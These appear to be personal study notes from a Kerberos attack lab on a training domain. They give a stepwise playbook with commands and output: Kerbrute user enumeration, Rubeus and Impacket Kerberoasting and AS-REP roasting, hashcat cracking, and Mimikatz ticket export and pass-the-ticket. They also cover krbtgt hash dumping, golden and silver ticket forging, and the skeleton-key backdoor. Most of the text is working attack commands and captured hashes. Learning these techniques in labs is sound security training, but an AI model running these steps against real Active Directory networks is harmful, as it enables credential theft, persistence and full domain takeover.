echo "<targetIP> CONTROLLER.local" >> /etc/hosts
 
**KERBRUTE**  
**Enumerate valid users on machine**  
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local user.txt
 
2023/03/14 19:44:37 > [+] VALID USERNAME: administrator@CONTROLLER.local  
2023/03/14 19:44:37 > [+] VALID USERNAME: admin1@CONTROLLER.local  
2023/03/14 19:44:37 > [+] VALID USERNAME: admin2@CONTROLLER.local  
2023/03/14 19:44:38 > [+] VALID USERNAME: httpservice@CONTROLLER.local  
2023/03/14 19:44:38 > [+] VALID USERNAME: machine2@CONTROLLER.local  
2023/03/14 19:44:38 > [+] VALID USERNAME: user1@CONTROLLER.local  
2023/03/14 19:44:38 > [+] VALID USERNAME: machine1@CONTROLLER.local  
2023/03/14 19:44:38 > [+] VALID USERNAME: user3@CONTROLLER.local  
2023/03/14 19:44:38 > [+] VALID USERNAME: sqlservice@CONTROLLER.local  
2023/03/14 19:44:38 > [+] VALID USERNAME: user2@CONTROLLER.local
 
**RUBEUS**  
After getting initial cmd.exe or powershell shell on windows machine:  
Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.
 
Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.
 
The tool has way too many attacks and features for me to cover all of them so I'll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here - https://github.com/GhostPack/Rubeus
 
**Harvesting tickets for pass the ticket attack:**  
Rubeus.exe harvest /interval:30 - This command tells Rubeus to harvest for TGTs every 30 seconds
 
**Brute force/password spraying:**  
Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command:  
echo 10.10.156.228 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
 
**KERBEROASTING with Rubeus (on target machine)**  
**User must be service account (msql/http/etc)**  
Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like **BloodHound** to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain. That is a bit out of scope for this room but it is a great tool for finding accounts to target.
 
In order to perform the attack, we'll be using both **Rubeus** as well as **Impacket** so you understand the various tools out there for Kerberoasting. There are other tools out there such a **kekeo** and **Invoke-Kerberoas**t but I'll leave you to do your own research on those tools.
 
**This will dump the Kerberos hash of any kerberoastable users:**  
Rubeus.exe kerberoast
 
**hashcat to crack the hash:**  
hashcat -m 13100 -a 0 hash.txt Pass.txt
 
**KERBEROASTING with Impacket (on local machine)**  
**User must be service account (msql/http/etc)**  
**Impacket Installation:**  
Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20  
1.) cd /opt navigate to your preferred directory to save tools in  
2.) download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19  
3.) cd Impacket-0.9.19 navigate to the impacket directory  
4.) pip install . - this will install all needed dependencies
 
**Grabbing kerberos ticket:**  
1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located  
2.) sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.156.228 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.  
3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash
 
After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the NTDS.dit. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.
 
**ASREPROASTING with Rubeus (on target machine):**  
Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. **Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.**
 
We'll continue using Rubeus same as we have with kerberoasting and harvesting since Rubeus has a very simple and easy to understand command to AS-REP roast and attack users with Kerberos pre-authentication disabled. After dumping the hash from Rubeus we'll use hashcat in order to crack the krbasrep5 hash.
 
There are other tools out as well for AS-REP Roasting such as kekeo and Impacket's GetNPUsers.py. Rubeus is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.
 
**This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes:**  
Rubeus.exe asreproast
 
Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....  
hashcat -m 18200 hash.txt Pass.txt
 
**ASREPROASTING with Impacket (on local machine):**  
Use:  
./kerbrute userenum -d spookysec.local --dc spookysec.local /user.txt  
To find asreproastable accounts. Then,
 
**Impacket** has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.  
Remember: Impacket may also need you to use a python version >=3.7. In the AttackBox you can do this by running your command with python3.9 /opt/impacket/examples/GetNPUsers.py.
 
python3 /opt/impacket/examples/GetNPUsers.py -usersfile user.txt spookysec.local/svc-admin -no-pas
 
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:44b6b0bc3286dcc2aba74fb638200966$63a7748df8c9ba669be1ee36de40b5eba5afd6f7143edac987aa551bf0478785910fd88f5249ff98fbb7c902b6a25c752a82ebba94053aca18e193cc8654f2f27255bda5fd1ceb53953a7b6651af07511b1a836d131757acf8d5cd9791c574c90411c4b86a48817c574897519dce1b0284cc2d5df0919a1542595f30261497483c87a754dc7fecd2ff37f0f32f0d3e30aba3d23210350f689b19262793349e6358c7b6a3bd4131e9e101b86acc223a8594d81a1aa526316acaaecac0e5a22040393892a2b43c9efa962d9dddab63e2b8ee1d097b3ce40d4454a76dbba01e599f6be0533b537c2596e2f4688ea7284688675b  
^Kerberos 5, etype 23, AS-REP - hascat  
hashcat -a 0 -m 18200 hash.txt pass.txt
 
**Pass the ticket attack with MIMIKATZ:**  
Mimikatz is a very popular and powerful post-exploitation tool most commonly used for dumping user credentials inside of an active directory network however we'll be using mimikatz in order to dump a TGT from LSASS memory
 
**Check permissions:**  
If you don't have an elevated command prompt mimikatz will not work properly.  
1.) **cd Downloads** - navigate to the directory mimikatz is in  
2.) **mimikatz.exe** - run mimikatz  
3.) **privilege::debug** - Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz  
4.) **sekurlsa::tickets /export** - this will export all of the .kirbi tickets into the directory that you are currently in
 
At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier

![DESKTOP-IS@cifs-Domain-Controller.CONTROLLER.local.kirbi Type: KIR81 File DESKTOP-IS@ldap Domain-controller.CONTROLLER.local.kirbi Type: KIR81 File DESKTOP-IS@krbtgt-CONTROLLER.LOCAL.kirbi Type: KIR81 File DESKTOP-IS@krbtgt-CONTROLLER.LOCAL.kirbi Type: KIR81 File Type: KIR81 File [0;2f08fb]-0-1-40a50000-Administrator@cifs Domain-Controller.CONTROLLER.local.kirbi Type: KIR81 File Type: KIR81 File Type: KIR81 File Type: KIR81 File ](Exported%20image%2020250424155732-0.png)  

When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt just like the one outlined in red above.
 
**Pass the Ticket w/ Mimikatz**  
Now that we have our ticket ready we can perform a pass the ticket attack to gain domain admin privileges.
 
1.) **kerberos::ptt <ticket>** - run this command inside of mimikatz with the ticket that you harvested from earlier. It will cache and impersonate the given ticket
 
kerberos::ptt [0;79852]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
 ![imikatz # kerberos: :ptt LOCAL . kirbi File: LOCAL : OK imikatz # ](Exported%20image%2020250424155733-1.png)  

2.) **klist** - (**exit** **out** of mimikatz before running klist) Here were just verifying that we successfully impersonated the ticket by listing our cached tickets.
 
We will not be using mimikatz for the rest of the attack.
 
3.) You now have impersonated the ticket giving you the same rights as the TGT you're impersonating. To verify this we can look at the admin share.
 
dir [\\10.10.183.19\admin$](file:///\\10.10.183.19\admin$) - (this will show you domain admin directory to confirm you are domain admin)
 ![: . CONTROLLER\Down10ads>k1ist urrent Logonld is 8:øx42bgdd ached Tickets: (1) Client: Administrator @ CONTROLLER. LOCAL server: krbtgt/CONTROLLER. LOCAL @ CONTROLLER. LOCAL KerbTicket Encryption Type: AES-2S6-CTS-+tAC-SHA1-96 Ticket Flags 8x6ßa1ßßßß -> forwardable forwarded renewable pre_authent name canonicalize Start Time: End Time: Renew Time: 5/19/2828 7:39 (local) 5/19/2828 (local) 5/26/2828 7:39 (local) session Key Type: AES-2S6-CTS-+tAC-SHA1-96 cache Flags: exi PRIMARY Kdc Called: ](Exported%20image%2020250424155738-2.png)  

**GOLDEN/SILVER TICKET with MIMIKATZ**  
A silver ticket can sometimes be better used in engagements rather than a golden ticket because it is a little more discreet. If stealth and staying undetected matter then a silver ticket is probably a better option than a golden ticket however the approach to creating one is the exact same. The key difference between the two tickets is that a silver ticket is limited to the service that is targeted whereas a golden ticket has access to any Kerberos service.
 
A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.
 
**KRBTGT Overview**  
In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket from the KRBTGT you give yourself the ability to create a service ticket for anything you want. A TGT is a ticket to a service account issued by the KDC and can only access that service the TGT is from like the SQLService ticket.
 
**Golden/Silver Ticket Attack Overview -**  
A golden ticket attack works by dumping the ticket-granting ticket of any user on the domain this would preferably be a domain admin however for a golden ticket you would dump the krbtgt ticket and for a silver ticket, you would dump any service or domain admin ticket. This will provide you with the service/domain admin account's SID or security identifier that is a unique identifier for each user account, as well as the NTLM hash. You then use these details inside of a mimikatz golden ticket attack in order to create a TGT that impersonates the given service account information.
 
**Dump the krbtgt hash -**  
﻿1.) **cd downloads && mimikatz.exe** - navigate to the directory mimikatz is in and run mimikatz  
2.) **privilege::debug** - ensure this outputs [privilege '20' ok]  
﻿3.) **lsadump::lsa /inject /name:krbtgt OR lsadump::dcsync /user:krbtgt** - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
 
**!! If you get errors with lsdump, try this to fix it in mimikatz:**  
mimikatz # !+  
mimikatz # !processprotect /process:lsass.exe /remove  
Process : lsass.exe  
PID 644
 
**Create a Golden/Silver Ticket -**  
﻿1.) **Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:** - This is the command for creating a golden ticket. to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.
 ![C: \Users\Administrator>cd Downloads && mimikatz . exe mimikatz 2.2.ø (x64) #18362 may 2 2828 "A La Vie, A L'Amour" (oe . eo) Benjamin DELPY gentilkiwi& ( benjamin@gentilkiwi . com ) > http:/'blog.gentilkiwi . com/mimikatz Vincent LE TOUX ( vincent.letoux@gmail . com ) > http://pingcastle.com / http://mysmartlogon . com mimikatz # privilege: :debug Privilege 28' OK mimikatz # Isadump: :lsa 'inject 'name: krbtgt Domain : CONTROLLER / s-1-5-21-849428856-2351964222-986696166 RID User (582) krbtgt primary NTLm : 5588588812ccøøscf7ß82aga89ebdfdf Hash NTLm: ntlm- 1m e: e: 5588588812ccøøscf7ß82aga89ebdfdf 5588588812ccøøscf7ß82aga89ebdfdf 372f4ß5dbß5d3cafd27f8e6a4aß97b2c ](Exported%20image%2020250424155739-3.png) ![imikatz # Isadump: ain : CONTROLLER / s-1 s -21-3893474861-143125734-2112886829 RID ser . (582) r btgt primary NTLm : 78558fßß4296a6f9438f4532164a7acd Hash NTLm: ntlm 1m e: e: 78558+884296a6f9438f4532164a7acd 78558fßß4296a6f9438f4532164a7acd b2ßß26a58e47ea9728f5bgaa17a1e77f ](Exported%20image%2020250424155740-4.png) ![inimikatz # kerberos: :golden /user:Adminstrator 'domain: controller. local /sid:s-1-s-21-84942ß856-2351964222-986696166 /krb ltgt:55ß85ßßß12ccøøscf7ß82aga89ebdfdf lid: see Adminstrator User Doma i n . controller. local (CONTROLLER) SID . s-1-5-21-849428856-2351964222-986696166 User Id Groups Id *513 512 528 518 519 ServiceKey: 5588588812ccøøscf7ß82aga89ebdfdf - rc4 hmac nt Lifetime . 5/19/2828 pm ; 5/17/2838 pm ; 5/17/2838 pm - > Ticket . ticket . kirbi PAC generated PAC signed EncTicketPart generated EncTicketPart encrypted KrbCred generated Final Ticket Saved to file ](Exported%20image%2020250424155741-5.png)  

Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:502
 
**Use the Golden/Silver Ticket to access other machines -**  
﻿1.) **misc::cmd** - this will open a new elevated command prompt with the given ticket in mimikatz.  
2.) Access machines that you want, what you can access will depend on the privileges of the user that you decided to take the ticket from however if you took the ticket from krbtgt you have access to the ENTIRE network hence the name golden ticket; however, silver tickets only have access to those that the user has access to if it is a domain admin it can almost access the entire network however it is slightly less elevated from a golden ticket.
 
dir [\\Desktop-1\C$](file:///\\Desktop-1\C$)

![C: \Users\Administrator\Down10ads>dir \\Desktop-1\c$ Volume in drive has Volume Serial Number is 4A19- FD6C Di rectory 83/18/2819 .84/'16,'2828 :1ß/ß6/2ß19 84/16/ 2828 .84,'28/2828 €5,'82/2828 of \\Desktop-1\c$ : 52 87. 87. • 52 87. 88. 83 . pm pm pm pm pm pm no label. PerfLogs Program Files Program Files Share Users Windows bytes 696 bytes free (x86) File(s) 6 Dir(s) 41,426,333, C: \Users \Administrator\Down10ads> ](Exported%20image%2020250424155742-6.png)

PsExec.exe [\\Desktop-1 cmd.exe](file:///\\Desktop-1 cmd.exe)

![C: \Users\Administrator\Down10ads>PsExec.exe \\Desktop-1 cmd . exe Execute pB3cesses remotely PsExec v2.2 Copyright (C) 2881-2816 mark Russinovich Sysinternals - www.sysinternals . com microsoft Windows [Version 18.8.18363.778] (c) 2819 microsoft Corporation. All rights reserved . : \Windows\system32>hostname sktop- 1 : ndows \ system32> ](Exported%20image%2020250424155743-7.png)   
This attack will not work without other machines on the domain however I challenge you to configure this on your own network and try out these attacks.
 
((**Can also use mimikatz in metasploit:**  
use kiwi  
golden_ticket_create  
kerberos_ticket_use  
shell))
 
lsadump::lsa /inject /name:Administrator  
lsadump::dcsync /user:Administrator
 
Rubeus.exe dump /luid:0x79852 /user:Administrator@CONTROLLER.LOCAL /service:krbtgt /server:krbtgt/CONTROLLER.LOCAL@CONTROLLER.LOCAL
 
**Kerberos BACKDOOR with Mimikatz:**  
Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.
 
The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.
 
The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password -"mimikatz"￼  
**Installing the Skeleton Key w/ mimikatz -**  
1.) **misc::skeleton** - Yes! that's it but don't underestimate this small command it is very powerful
 
**Accessing the forest -**
 
The default credentials will be: "mimikatz"
 
example: **net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz** - The share will now be accessible without the need for the Administrators password
 
example: **dir** **\\Desktop-1\c$** **/user:Machine1 mimikatz** - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
 
The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.